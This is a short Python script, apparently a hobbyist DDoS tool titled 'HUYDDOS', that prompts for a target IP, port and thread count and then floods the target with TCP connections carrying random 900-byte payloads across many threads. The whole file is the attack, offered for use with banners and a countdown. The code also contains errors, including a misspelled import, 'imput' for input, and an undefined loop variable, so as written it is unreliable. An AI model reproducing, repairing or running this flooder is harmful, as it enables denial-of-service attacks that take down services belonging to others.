import random
import threading
import socket
import os
import time
from termcoler import colored 
os.system('cls')
print(colored(r"""
██╗░░██╗██╗░░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░░██████╗
██║░░██║██║░░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
███████║██║░░░██║░╚████╔╝░██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══██║██║░░░██║░░╚██╔╝░░██║░░██║██║░░██║██║░░██║░╚═══██╗
██║░░██║╚██████╔╝░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                                                Created By HuyXingum""", 'red'))
print(colored("\n########################################################################\n", 'green'))
ip = str(input(colored("[+] IP: ", 'green')))
port = int(input(colored("[+] Port: ", 'green')))
packet = int(imput(colored("[+] Threads: ", 'green')))
time.sleep(1.5)
os.system('cls')
print(colored(r"""
░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝ """, 'green'))
print(colored("\n########################################################################", 'red'))
time.sleep(2)
print(colored("\n[+] Start...", 'green'))
time.sleep(1)
print(colored("\n3", 'green'))
time.sleep(1)
print(colored("\n2", 'green'))
time.sleep(1)
print(colored("\n1", 'green'))
os.system('cls')
def syn():

    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb += 1
            print(colored('[+] Attaking '+ip + '>>>Sent: '+str(bb), 'red'))
        except KeyboardInterrupt:
            h.close()
            print(colored("[+++] DONE !!!", 'green'))
            pass
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()